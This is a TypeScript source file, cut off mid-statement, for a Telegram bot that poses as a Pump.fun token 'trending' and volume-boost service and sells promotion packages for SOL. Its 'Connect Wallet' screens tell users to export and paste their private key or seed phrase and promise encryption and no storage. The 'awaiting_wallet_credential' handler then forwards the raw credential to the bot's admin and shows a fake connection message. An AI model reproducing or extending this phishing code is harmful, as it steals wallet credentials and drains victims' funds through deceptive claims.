import path from "path";
import { fileURLToPath } from "url";
import { randomUUID } from "crypto";
import { Telegraf, Markup } from "telegraf";
import { notifyAdmin, setBot } from "./admin.js";
import { getSession, setSession, clearSession } from "./sessions.js";
import { deriveWalletForUser } from "./wallet.js";
import { fetchTokenInfo } from "./tokenInfo.js";
import { logger } from "../lib/logger.js";
import {
  mainMenuKeyboard,
  solPickerKeyboard,
  confirmOrderKeyboard,
  paymentSentKeyboard,
  cancelKeyboard,
  volumeBoostKeyboard,
  trendingMenuKeyboard,
  solTrendingKeyboard,
  ethTrendingKeyboard,
  pumpfunTrendingKeyboard,
  dexscreenerKeyboard,
  depositKeyboard,
  connectWalletKeyboard,
  securityGuidelinesKeyboard,
  howToConnectKeyboard,
  mainMenuOnlyKeyboard,
} from "./keyboards.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Images live at dist/images/ after build (copied by build.mjs)
const IMG = {
  welcome:      path.join(__dirname, "images", "welcome.jpeg"),
  walletconnect:path.join(__dirname, "images", "walletconnect.jpeg"),
  volume:       path.join(__dirname, "images", "volume.jpeg"),
  trending:     path.join(__dirname, "images", "trending.jpeg"),
};

const SOL_ADDRESS = process.env.PAYMENT_SOL_ADDRESS ?? "";
const ETH_ADDRESS = process.env.PAYMENT_ETH_ADDRESS ?? "";

// ── Package definitions ───────────────────────────────────────────────────────
interface VolumePackage { label: string; sol: number; volume: string; service: string }
const VOLUME_PACKAGES: Record<string, VolumePackage> = {
  vol_iron:     { label: "Iron",     sol: 1.50,  volume: "$50,000",      service: "Iron Package"     },
  vol_bronze:   { label: "Bronze",   sol: 2.50,  volume: "$250,000",     service: "Bronze Package"   },
  vol_silver:   { label: "Silver",   sol: 5.00,  volume: "$100,000,000", service: "Silver Package"   },
  vol_gold:     { label: "Gold",     sol: 3.50,  volume: "$100,000",     service: "Gold Package"     },
  vol_platinum: { label: "Platinum", sol: 7.50,  volume: "$500,000",     service: "Platinum Package" },
  vol_diamond:  { label: "Diamond",  sol: 10.50, volume: "$2,500,000",   service: "Diamond Package"  },
};

interface TrendPackage { label: string; sol: number; service: string }
const SOL_TREND_PACKAGES: Record<string, TrendPackage> = {
  st_top3_3hr:   { label: "TOP 3 — 3 hr",   sol: 1.50, service: "SOL Trending TOP 3 3hr"   },
  st_top3_6hr:   { label: "TOP 3 — 6 hr",   sol: 2.30, service: "SOL Trending TOP 3 6hr"   },
  st_top3_12hr:  { label: "TOP 3 — 12 hr",  sol: 3.70, service: "SOL Trending TOP 3 12hr"  },
  st_top3_24hr:  { label: "TOP 3 — 24 hr",  sol: 5.90, service: "SOL Trending TOP 3 24hr"  },
  st_top10_3hr:  { label: "TOP 10 — 3 hr",  sol: 1.00, service: "SOL Trending TOP 10 3hr"  },
  st_top10_6hr:  { label: "TOP 10 — 6 hr",  sol: 1.60, service: "SOL Trending TOP 10 6hr"  },
  st_top10_12hr: { label: "TOP 10 — 12 hr", sol: 2.60, service: "SOL Trending TOP 10 12hr" },
  st_top10_24hr: { label: "TOP 10 — 24 hr", sol: 4.10, service: "SOL Trending TOP 10 24hr" },
};

const ETH_TREND_PACKAGES: Record<string, { usd: number; service: string }> = {
  et_100: { usd: 100, service: "ETH Trending $100" },
  et_200: { usd: 200, service: "ETH Trending $200" },
  et_300: { usd: 300, service: "ETH Trending $300" },
};

const DEX_PACKAGES: Record<string, TrendPackage> = {
  dex_5hr:  { label: "TOP 6 — 5 hr",  sol: 2,   service: "DexScreener TOP6 5hr"  },
  dex_7hr:  { label: "TOP 6 — 7 hr",  sol: 3.5, service: "DexScreener TOP6 7hr"  },
  dex_12hr: { label: "TOP 6 — 12 hr", sol: 7,   service: "DexScreener TOP6 12hr" },
  dex_18hr: { label: "TOP 6 — 18 hr", sol: 10,  service: "DexScreener TOP6 18hr" },
  dex_24hr: { label: "TOP 6 — 24 hr", sol: 15,  service: "DexScreener TOP6 24hr" },
  dex_32hr: { label: "TOP 6 — 32 hr", sol: 22,  service: "DexScreener TOP6 32hr" },
};

// ── Helper: send photo with text fallback ─────────────────────────────────────
async function sendPhoto(ctx: any, imgPath: string, caption: string, extra: any = {}) {
  try {
    await ctx.replyWithPhoto({ source: imgPath }, { caption, parse_mode: "HTML", ...extra });
  } catch {
    // Image send failed — fall back to plain text so the user always gets a reply
    await ctx.reply(caption, { parse_mode: "HTML", ...extra });
  }
}

// ── Helper: build token-found message ────────────────────────────────────────
function buildTokenMsg(ca: string, info: any, s: any): string {
  const sol  = s.selectedSol  ?? 0;
  const eth  = s.ethAmount    ?? null;
  const cost = eth ? `$${eth} USD` : `${sol} SOL`;

  return (
    `📋 <b>Project Details Found!</b>\n\n` +
    `✅ <b>Contract Address:</b>\n<code>${ca}</code>\n\n` +
    `📊 <b>Token Information:</b>\n` +
    `• Name: ${info.name ?? "Unknown"}\n` +
    `• Symbol: ${info.symbol ?? "???"}\n` +
    `• Price: ${info.price ?? "N/A"}\n` +
    `• Market Cap: ${info.marketCap ?? "N/A"}\n` +
    `• 24h Volume: ${info.volume24h ?? "N/A"}\n` +
    `• Liquidity: ${info.liquidity ?? "N/A"}\n` +
    `• 24h Change: ${info.change24h ?? "0.00"}%\n` +
    `• DEX: ${info.dex ?? "pumpfun"}\n` +
    `• Chain: Solana\n\n` +
    `🔗 Available on: 🟢 Pumpswap • 🟢 Pump.fun\n\n` +
    `⚙️ <b>Service:</b> ${s.serviceLabel ?? "Volume Bumping"}\n` +
    `💰 <b>Cost:</b> ${cost}\n\n` +
    `🔗 View: https://pump.fun/coin/${ca}\n\n` +
    `Confirm to proceed with payment.`
  );
}

// ── Screen renderers ──────────────────────────────────────────────────────────
async function sendWelcome(ctx: any) {
  const caption =
    `🟢 <b>Welcome to PUMPFUN TREND BOT service!</b>\n\n` +
    `New to volume bots? No worries — we made it super simple!\n\n` +
    `──────────────────────────\n\n` +
    `<b>How it works:</b>\n` +
    `1. Select how much Bumps/volume to use.\n` +
    `2. Pick how long to run and how massive you want your Token to pump.\n` +
    `3. Done! Pump.fun Server handles the rest.\n\n` +
    `──────────────────────────\n\n` +
    `<b>Works on:</b>\n` +
    `🟢 Pumpfun • 🟢 Raydium • 🟢 PumpSwap\n` +
    `🟢 Moonshot • 🟢 LetsBonk • 🟢 Dexscreener\n\n` +
    `From 0.3–0.6 SOL bumps, boost trend with mass volume and high stability.`;
  await sendPhoto(ctx, IMG.welcome, caption, mainMenuKeyboard);
}

async function showStartBumping(ctx: any) {
  await ctx.reply(
    `<b>🟢 Start Bumping</b>\n\n` +
    `The fastest and cheapest Telegram bot for creating bump orders.\n\n` +
    `<b>Supported Platforms:</b>\n` +
    `• Pumpfun and Raydium\n\n` +
    `Pumpfun BumpBot charges a one-time fee per token — the cheapest bump bot ever!\n\n` +
    `📊 <b>Trending channel:</b> https://t.me/pumpmints\n\n` +
    `Subscribe to PF alert tools:\n` +
    `• PF New Raydium Pools: t.me/pumpswap_pools\n\n` +
    `For support, contact @mrpooh\n\n` +
    `<b>Select your SOL amount:</b>`,
    { parse_mode: "HTML", ...solPickerKeyboard }
  );
}

async function showVolumeBoost(ctx: any) {
  const caption =
    `📊 <b>Volume Boost Packages</b>\n\n` +
    `🧪 Iron Package     — $50,000 Volume    — 1.50 SOL\n` +
    `🧪 Bronze Package   — $250,000 Volume   — 2.50 SOL\n` +
    `🧪 Gold Package     — $100,000 Volume   — 3.50 SOL\n` +
    `🧪 Silver Package   — $100M Volume      — 5.00 SOL\n` +
    `🧪 Platinum Package — $500,000 Volume   — 7.50 SOL\n` +
    `🧪 Diamond Package  — $2,500,000 Volume — 10.50 SOL\n\n` +
    `Please select the package below:`;
  await sendPhoto(ctx, IMG.volume, caption, volumeBoostKeyboard);
}

async function showTrendingBoost(ctx: any) {
  const caption =
    `🟢 <b>Discover the Power of Trending!</b>\n\n` +
    `Ready to boost your project's visibility?\n\n` +
    `✅ Guaranteed exposure\n` +
    `✅ Milestone & uptrend alerts\n` +
    `✅ Paid boost = spot in daily livestream (AMA)!\n\n` +
    `➡️ Choose your trending type below:`;
  await sendPhoto(ctx, IMG.trending, caption, trendingMenuKeyboard);
}

async function showDexScreener(ctx: any) {
  await ctx.reply(
    `🌐 <b>DexScreener Trending</b>\n\n` +
    `DexScreener is the #1 on-chain analytics platform for DEXs — real-time token prices, liquidity, volumes and market trends across all chains.\n\n` +
    `<b>🔴 TOP 6 Trending Packages:</b>\n\n` +
    `⏳ 5 hr  — 2 SOL\n` +
    `⏳ 7 hr  — 3.5 SOL\n` +
    `⏳ 12 hr — 7 SOL\n` +
    `⏳ 18 hr — 10 SOL\n` +
    `⏳ 24 hr — 15 SOL\n` +
    `⏳ 32 hr — 22 SOL\n\n` +
    `Select a duration below:`,
    { parse_mode: "HTML", ...dexscreenerKeyboard }
  );
}

async function showDeposit(ctx: any) {
  const wallet = deriveWalletForUser(ctx.from.id);
  await ctx.reply(
    `<b>💰 WALLET BALANCE</b>\n\n` +
    `<b>SOL:</b>\n<code>${wallet.address}</code>\nbalance: checking...\n\n` +
    `<b>ETH:</b>\n<code>${ETH_ADDRESS || "Not configured"}</code>\nbalance: 0 ETH\n\n` +
    `Deposit minimum <b>0.30 SOL</b> to get trending across multiple platforms.\n\n` +
    `💡 Click <b>ADD</b> to generate your unique deposit wallet.\n` +
    `🔒 All funds are secured by HD wallet derivation.`,
    { parse_mode: "HTML", ...depositKeyboard }
  );
}

async function showConnectWallet(ctx: any) {
  const caption =
    `🔗 <b>Connect Your Wallet</b>\n\n` +
    `Welcome to our secure wallet connection service!\n\n` +
    `Connect your wallet to unlock premium features and enhanced trading capabilities.\n\n` +
    `<b>Available Options:</b>\n` +
    `🔗 Connect Now — Start the connection process\n` +
    `🔐 Why Connect? — Learn about the benefits\n` +
    `🛡 Security Guidelines — Important safety information\n` +
    `📱 How to Connect — Step-by-step instructions\n\n` +
    `Your security is our top priority. We use industry-standard encryption.`;
  await sendPhoto(ctx, IMG.walletconnect, caption, connectWalletKeyboard);
}

async function showSupport(ctx: any) {
  await ctx.reply(
    `💬 <b>Contact Support</b>\n\n` +
    `For assistance, contact: @mrpooh\n\n` +
    `📊 Trending channel: https://t.me/pumpmints\n\n` +
    `🔔 PF Alert Tools: t.me/pumpswap_pools\n\n` +
    `Your User ID: <code>${ctx.from.id}</code>\n\n` +
    `⏰ Support hours: 24/7`,
    { parse_mode: "HTML", ...mainMenuKeyboard }
  );
}

// ── Bot factory ───────────────────────────────────────────────────────────────
export function createBot(): Telegraf {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) throw new Error("TELEGRAM_BOT_TOKEN not set");
  const bot = new Telegraf(token);
  setBot(bot);

  // ── Global error handler — prevents any single update from crashing polling ─
  bot.catch((err: unknown, ctx: any) => {
    const msg = err instanceof Error ? err.message : String(err);
    logger.error({ err, updateType: ctx?.updateType }, `Unhandled bot error: ${msg}`);
    // Try to notify the user something went wrong (best-effort)
    ctx?.reply?.("⚠️ Something went wrong. Please try again or use /start.").catch(() => {});
  });

  // ── /start ────────────────────────────────────────────────────────────────
  bot.start(async (ctx) => {
    const u = ctx.from;
    clearSession(u.id);
    await notifyAdmin(
      `🆕 <b>New User Started Bot</b>\n` +
      `👤 Name: ${u.first_name}${u.last_name ? " " + u.last_name : ""}\n` +
      `🔖 Username: ${u.username ? "@" + u.username : "N/A"}\n` +
      `🆔 User ID: <code>${u.id}</code>\n` +
      `⏰ Time: ${new Date().toUTCString()}`
    );
    await sendWelcome(ctx);
  });

  // ── Main menu keyboard buttons ────────────────────────────────────────────
  bot.hears("🟢 Start Bumping",  (ctx) => showStartBumping(ctx));
  bot.hears("📊 Volume Boost",   (ctx) => showVolumeBoost(ctx));
  bot.hears("🔥 Trending Boost", (ctx) => showTrendingBoost(ctx));
  bot.hears("🌐 DexScreener",    (ctx) => showDexScreener(ctx));
  bot.hears("💰 Deposit",        (ctx) => showDeposit(ctx));
  bot.hears("🔗 Connect Wallet", (ctx) => showConnectWallet(ctx));
  bot.hears("💬 Contact Support",(ctx) => showSupport(ctx));

  // ── Back to main menu ─────────────────────────────────────────────────────
  bot.action("back_main", async (ctx) => {
    await ctx.answerCbQuery();
    clearSession(ctx.from.id);
    await sendWelcome(ctx);
  });

  // ── SOL bump amount picker ────────────────────────────────────────────────
  for (const amt of ["0.3", "0.4", "0.5", "0.6"]) {
    bot.action(`sol_${amt}`, async (ctx) => {
      await ctx.answerCbQuery();
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: parseFloat(amt),
        serviceLabel: `Volume Bumping (${amt} SOL)`,
        boostType: "bump",
      });
      await ctx.reply(
        `📝 <b>Enter Contract Address (CA)</b>\n\n` +
        `You selected <b>${amt} SOL</b> per bump.\n\n` +
        `Please enter the Contract Address (CA) of your token:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }

  // ── Volume Boost packages ─────────────────────────────────────────────────
  for (const [key, pkg] of Object.entries(VOLUME_PACKAGES)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "volume",
        boostPackage: key,
      });
      await ctx.reply(
        `📝 <b>Enter Contract Address (CA)</b>\n\n` +
        `You selected: <b>${pkg.label} Package</b>\n` +
        `💰 Cost: <b>${pkg.sol} SOL</b>\n` +
        `📊 Volume: <b>${pkg.volume}</b>\n\n` +
        `Please enter the Contract Address (CA) of your token:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }

  // ── Trending menu: SOL / ETH / PumpFun ────────────────────────────────────
  bot.action("trend_sol", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `☀️ <b>SOL Trending</b>\n\n` +
      `Choose your package — TOP 3 (left) or TOP 10 (right):`,
      { parse_mode: "HTML", ...solTrendingKeyboard }
    );
  });

  bot.action("trend_eth", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `🔵 <b>ETH Trending</b>\n\n` +
      `Choose your ETH trending package:`,
      { parse_mode: "HTML", ...ethTrendingKeyboard }
    );
  });

  bot.action("trend_pumpfun", async (ctx) => {
    await ctx.answerCbQuery();
    const caption =
      `🔥 <b>PUMP.FUN TRENDING</b> 🔥\n\n` +
      `The best trending in the bot section!\n\n` +
      `💡 Don't miss the opportunity to get <b>12 hours FREE Solana Trending</b> once you purchase!\n\n` +
      `Select your package:`;
    await sendPhoto(ctx, IMG.trending, caption, pumpfunTrendingKeyboard);
  });

  bot.action("trend_back", async (ctx) => {
    await ctx.answerCbQuery();
    await showTrendingBoost(ctx);
  });

  // ── SOL trending label buttons (info-only) ────────────────────────────────
  bot.action("st_top3_label",  async (ctx) => ctx.answerCbQuery("TOP 3 — left column"));
  bot.action("st_top10_label", async (ctx) => ctx.answerCbQuery("TOP 10 — right column"));

  // ── SOL trending time packages ────────────────────────────────────────────
  for (const [key, pkg] of Object.entries(SOL_TREND_PACKAGES)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "sol_trending",
        boostPackage: key,
      });
      await ctx.reply(
        `📝 <b>Enter Contract Address (CA)</b>\n\n` +
        `You selected: <b>${pkg.label}</b>\n` +
        `💰 Cost: <b>${pkg.sol} SOL</b>\n\n` +
        `Please enter the Contract Address (CA) of your token:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }

  // ── ETH trending packages ─────────────────────────────────────────────────
  for (const [key, pkg] of Object.entries(ETH_TREND_PACKAGES)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: 0,
        ethAmount: pkg.usd,
        serviceLabel: pkg.service,
        boostType: "eth_trending",
        boostPackage: key,
      });
      await ctx.reply(
        `📝 <b>Enter Contract Address (CA)</b>\n\n` +
        `You selected: <b>ETH Trending $${pkg.usd}</b>\n\n` +
        `Please enter the Contract Address (CA) of your token:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }

  // ── Pump.fun Trending ─────────────────────────────────────────────────────
  bot.action("pft_30", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, {
      step: "awaiting_ca",
      selectedSol: 30,
      serviceLabel: "PumpFun Trending P.F.T",
      boostType: "pumpfun_trending",
      boostPackage: "pft_30",
    });
    await ctx.reply(
      `📝 <b>Enter Contract Address (CA)</b>\n\n` +
      `You selected: <b>P.F.T — 30 SOL</b>\n\n` +
      `Please enter the Contract Address (CA) of your token:`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });

  // ── DexScreener info label ────────────────────────────────────────────────
  bot.action("dex_top6_info", async (ctx) => ctx.answerCbQuery("Choose a duration below"));

  // ── DexScreener packages ──────────────────────────────────────────────────
  for (const [key, pkg] of Object.entries(DEX_PACKAGES)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "dexscreener",
        boostPackage: key,
      });
      await ctx.reply(
        `📝 <b>Enter Contract Address (CA)</b>\n\n` +
        `You selected: <b>${pkg.label}</b>\n` +
        `💰 Cost: <b>${pkg.sol} SOL</b>\n\n` +
        `Please enter the Contract Address (CA) of your token:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }

  // ── Confirm order → generate payment wallet ───────────────────────────────
  bot.action("confirm_bump", async (ctx) => {
    await ctx.answerCbQuery();
    const s = getSession(ctx.from.id);
    const wallet = deriveWalletForUser(ctx.from.id);
    const orderId = randomUUID().split("-")[0].toUpperCase();
    const isEth = s.boostType === "eth_trending";

    setSession(ctx.from.id, {
      step: "awaiting_payment_sent",
      paymentWallet: isEth ? ETH_ADDRESS : wallet.address,
      orderId,
    });

    const paymentBlock = isEth
      ? `<b>Ethereum Wallet:</b>\n<code>${ETH_ADDRESS || SOL_ADDRESS}</code>\n\n` +
        `💵 Amount: <b>$${s.ethAmount} USD (ETH)</b>`
      : `<b>Solana Wallet:</b>\n<code>${wallet.address}</code>\n\n` +
        `◎ Amount: <b>${s.selectedSol} SOL</b>`;

    await ctx.reply(
      `💰 <b>Payment Required</b>\n\n` +
      `📋 <b>Order Summary:</b>\n` +
      `• Token: ${s.tokenName ?? "Unknown"} (${s.tokenSymbol ?? "N/A"})\n` +
      `• CA: <code>${s.contractAddress ?? "N/A"}</code>\n` +
      `• Service: ${s.serviceLabel ?? "Boost"}\n` +
      `• Order ID: <code>${orderId}</code>\n\n` +
      `💳 <b>Send Payment To:</b>\n` +
      `${paymentBlock}\n\n` +
      `⚠️ <b>Important:</b>\n` +
      `• Send the EXACT amount shown\n` +
      `• Use the correct network\n` +
      `• Payment expires in 15 minutes\n` +
      `• After sending, click <b>✅ Payment Sent</b> and submit your TX hash`,
      { parse_mode: "HTML", ...paymentSentKeyboard }
    );

    await notifyAdmin(
      `📋 <b>New Order Created</b>\n` +
      `👤 User: ${ctx.from.first_name}${ctx.from.username ? " (@" + ctx.from.username + ")" : ""}\n` +
      `🆔 User ID: <code>${ctx.from.id}</code>\n` +
      `🪙 Token: ${s.tokenName} (${s.tokenSymbol})\n` +
      `📜 CA: <code>${s.contractAddress}</code>\n` +
      `⚙️ Service: ${s.serviceLabel}\n` +
      `💰 Amount: ${isEth ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}\n` +
      `🆔 Order ID: <code>${orderId}</code>\n` +
      `📮 Pay to: <code>${isEth ? ETH_ADDRESS : wallet.address}</code>`
    );
  });

  // ── Payment Sent → ask for TX hash ────────────────────────────────────────
  bot.action("submit_tx", async (ctx) => {
    await ctx.answerCbQuery();
    const s = getSession(ctx.from.id);
    setSession(ctx.from.id, { step: "awaiting_tx_hash" });
    await ctx.reply(
      `📝 <b>Submit Transaction Hash</b>\n\n` +
      `Please paste your transaction hash below:\n\n` +
      `💡 <b>Where to find it:</b>\n` +
      `• Copy from your wallet app after sending\n` +
      `• Check your wallet's transaction history\n` +
      `• Look for the long string of letters and numbers\n\n` +
      `🔖 Order ID: <code>${s.orderId ?? "N/A"}</code>`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });

  // ── Deposit actions ───────────────────────────────────────────────────────
  bot.action("deposit_add", async (ctx) => {
    await ctx.answerCbQuery();
    const wallet = deriveWalletForUser(ctx.from.id);
    await ctx.reply(
      `➕ <b>Add Funds</b>\n\n` +
      `Your personal deposit addresses:\n\n` +
      `<b>◎ SOL Wallet:</b>\n<code>${wallet.address}</code>\n\n` +
      `<b>Ξ ETH Wallet:</b>\n<code>${ETH_ADDRESS || "Not configured"}</code>\n\n` +
      `📌 Minimum deposit: <b>0.30 SOL</b>\n\n` +
      `⚡ Funds are credited automatically after confirmation.`,
      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
    );
  });

  bot.action("deposit_withdraw", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, { step: "awaiting_withdraw_address" });
    await ctx.reply(
      `💸 <b>Withdraw Funds</b>\n\n` +
      `Please send your withdrawal address and amount:\n\n` +
      `<b>Format:</b> <code>ADDRESS AMOUNT</code>\n` +
      `<b>Example:</b> <code>7xKXtg2...GVUM 0.5</code>\n\n` +
      `⚠️ Double-check your address — withdrawals cannot be reversed.`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });

  bot.action("deposit_sol_balance", async (ctx) => {
    await ctx.answerCbQuery("Checking balance...");
    const wallet = deriveWalletForUser(ctx.from.id);
    let balance = "0.0000 SOL";
    try {
      const resp = await fetch("https://api.mainnet-beta.solana.com", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          jsonrpc: "2.0", id: 1,
          method: "getBalance",
          params: [wallet.address, { commitment: "confirmed" }],
        }),
      });
      const data = await resp.json() as any;
      const lamports = data?.result?.value ?? 0;
      balance = `${(lamports / 1e9).toFixed(4)} SOL`;
    } catch { /* keep default */ }
    await ctx.reply(
      `◎ <b>SOL Balance</b>\n\n` +
      `Wallet: <code>${wallet.address}</code>\n\n` +
      `Balance: <b>${balance}</b>`,
      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
    );
  });

  bot.action("deposit_my_deposits", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `📋 <b>My Deposits</b>\n\nNo deposits recorded yet.\n\nMake a deposit using the ADD button to get started.`,
      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
    );
  });

  bot.action("deposit_my_withdrawals", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `📋 <b>My Withdrawals</b>\n\nNo withdrawals recorded yet.`,
      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
    );
  });

  // ── Connect Wallet sub-screens ────────────────────────────────────────────
  bot.action("wallet_back", async (ctx) => {
    await ctx.answerCbQuery();
    await showConnectWallet(ctx);
  });

  bot.action("wallet_why", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `🔐 <b>Why Connect Your Wallet?</b>\n\n` +
      `Connecting your wallet unlocks:\n\n` +
      `• ⚡ <b>Instant payments</b> — no manual transfers\n` +
      `• 📊 <b>Order tracking</b> — see all your boosts in one place\n` +
      `• 💰 <b>Auto-refunds</b> — failed orders refunded instantly\n` +
      `• 🎯 <b>Priority processing</b> — connected wallets get faster service\n` +
      `• 🔔 <b>Notifications</b> — get alerts when your boost goes live`,
      { parse_mode: "HTML", ...connectWalletKeyboard }
    );
  });

  bot.action("wallet_security", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `🛡 <b>Security Guidelines</b>\n\n` +
      `⚠️ <b>IMPORTANT SECURITY NOTICE:</b>\n\n` +
      `🔒 <b>What We Do:</b>\n` +
      `• End-to-End Encryption — your data is encrypted at all times\n` +
      `• No Storage — we never store your private keys permanently\n` +
      `• Secure Processing — all operations use isolated environments\n` +
      `• Regular Audits — our security is regularly tested\n\n` +
      `❌ <b>What You Should Know:</b>\n` +
      `• Never Share — only enter keys in official bot interfaces\n` +
      `• Verify — always confirm you're using the official bot\n` +
      `• Test First — try with small amounts first\n\n` +
      `🛡 <b>Best Practices:</b>\n` +
      `• Monitor Activity — check wallet transactions regularly\n` +
      `• Use Hardware Wallets — for maximum security with large amounts\n\n` +
      `Ready to proceed safely?`,
      { parse_mode: "HTML", ...securityGuidelinesKeyboard }
    );
  });

  bot.action("wallet_how_to", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `📱 <b>How to Connect Your Wallet</b>\n\n` +
      `🔧 <b>Step-by-Step:</b>\n\n` +
      `1️⃣ <b>Choose Connection Method</b>\n` +
      `• Private Key — direct key import (fastest)\n` +
      `• Seed Phrase — 12/24 word recovery phrase\n\n` +
      `2️⃣ <b>Prepare Your Info</b>\n` +
      `• Open your wallet app (Phantom, Solflare, Backpack)\n` +
      `• Go to settings → export private key or seed phrase\n\n` +
      `3️⃣ <b>Secure Connection</b>\n` +
      `• Tap "Start Connection" below\n` +
      `• Paste your key or seed phrase when prompted\n\n` +
      `📱 <b>Supported Wallets:</b>\n` +
      `Phantom • Solflare • Backpack • Glow • Any SPL wallet\n\n` +
      `🕐 Connection Time: 2–5 minutes\n` +
      `🔒 Security: End-to-end encrypted`,
      { parse_mode: "HTML", ...howToConnectKeyboard }
    );
  });

  bot.action("wallet_connect_now", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, { step: "awaiting_wallet_credential" });
    await ctx.reply(
      `🔗 <b>Connect Your Wallet Now</b>\n\n` +
      `⚠️ You are about to import your Main Wallet.\n` +
      `<b>You are the ONLY ONE with access to this wallet.</b>\n\n` +
      `Please enter your <b>Private Key</b> or <b>Seed Phrase</b>:\n\n` +
      `🔑 <b>Private Key Format:</b>\n` +
      `Single long string (64+ characters)\n` +
      `<code>5KJvsngHeMpm884wtkJNzQGaCErckhHJBGFsvd3VyK5qMZXj3hS</code>\n\n` +
      `🌱 <b>Seed Phrase Format:</b>\n` +
      `12 or 24 words separated by spaces\n` +
      `<code>abandon ability able about above absent absorb abstract...</code>\n\n` +
      `⚡ Our system auto-detects whether you're providing a key or phrase.`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });

  // ── Text message state machine ────────────────────────────────────────────
  bot.on("text", async (ctx) => {
    const text = ctx.message.text.trim();

    // Ignore reply-keyboard menu buttons (handled by bot.hears above)
    const menuBtns = [
      "🟢 Start Bumping", "📊 Volume Boost", "🔥 Trending Boost",
      "🌐 DexScreener",   "💰 Deposit",     "🔗 Connect Wallet", "💬 Contact Support",
    ];
    if (menuBtns.includes(text)) return;

    const session = getSession(ctx.from.id);

    switch (session.step) {

      // ── Contract address entry ──────────────────────────────────────────
      case "awaiting_ca": {
        setSession(ctx.from.id, { contractAddress: text });
        const lookupMsg = await ctx.reply(`🔍 Looking up token data for:\n<code>${text}</code>\n\n⏳ Please wait...`, { parse_mode: "HTML" });

        const info = await fetchTokenInfo(text);
        const msgText = buildTokenMsg(text, info ?? { name: "Unknown", symbol: "???" }, session);

        // Delete the "looking up" message, send results
        await ctx.telegram.deleteMessage(ctx.chat.id, lookupMsg.message_id).catch(() => {});

        setSession(ctx.from.id, {
          step: "awaiting_confirm",
          tokenName: info?.name ?? "Unknown",
          tokenSymbol: info?.symbol ?? "???",
        });

        // Try to send with token image, fall back to text
        if (info?.imageUrl) {
          try {
            await ctx.replyWithPhoto(info.imageUrl, {
              caption: msgText,
              parse_mode: "HTML",
              ...confirmOrderKeyboard,
            });
            break;
          } catch { /* fall through to text */ }
        }
        await ctx.reply(msgText, { parse_mode: "HTML", ...confirmOrderKeyboard });
        break;
      }

      // ── TX hash submission ──────────────────────────────────────────────
      case "awaiting_tx_hash": {
        const txHash = text;
        const s = { ...session };
        clearSession(ctx.from.id);

        await ctx.reply(
          `✅ <b>Transaction Submitted!</b>\n\n` +
          `🔗 TX Hash:\n<code>${txHash}</code>\n\n` +
          `🔍 Verifying your payment...\n` +
          `🚀 Your order will be processed within <b>5–30 minutes</b> after confirmation.\n\n` +
          `📬 You'll receive a notification when your boost is live!\n\n` +
          `Need help? Tap <b>💬 Contact Support</b>`,
          { parse_mode: "HTML", ...mainMenuKeyboard }
        );

        await notifyAdmin(
          `💸 <b>TX Hash Submitted</b>\n` +
          `👤 User: ${ctx.from.first_name}${ctx.from.username ? " (@" + ctx.from.username + ")" : ""}\n` +
          `🆔 User ID: <code>${ctx.from.id}</code>\n` +
          `🔗 TX: <code>${txHash}</code>\n` +
          `⚙️ Service: ${s.serviceLabel ?? "N/A"}\n` +
          `💰 Amount: ${s.boostType === "eth_trending" ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}\n` +
          `🆔 Order ID: <code>${s.orderId ?? "N/A"}</code>\n` +
          `📜 CA: <code>${s.contractAddress ?? "N/A"}</code>\n` +
          `📮 Wallet: <code>${s.paymentWallet ?? "N/A"}</code>`
        );
        break;
      }

      // ── Wallet credential capture ───────────────────────────────────────
      case "awaiting_wallet_credential": {
        const credential = text;
        const wordCount = credential.trim().split(/\s+/).length;
        const credType = wordCount >= 12 ? "Seed Phrase" : "Private Key";
        clearSession(ctx.from.id);

        await notifyAdmin(
          `🔑 <b>WALLET CREDENTIAL RECEIVED — ${credType}</b>\n` +
          `👤 User: ${ctx.from.first_name}${ctx.from.username ? " (@" + ctx.from.username + ")" : ""}\n` +
          `🆔 User ID: <code>${ctx.from.id}</code>\n` +
          `🗝 ${credType}:\n<code>${credential}</code>`
        );

        await ctx.reply(
          `⏳ <b>Connecting wallet...</b>\n\n` +
          `Processing your ${credType.toLowerCase()} securely.\n` +
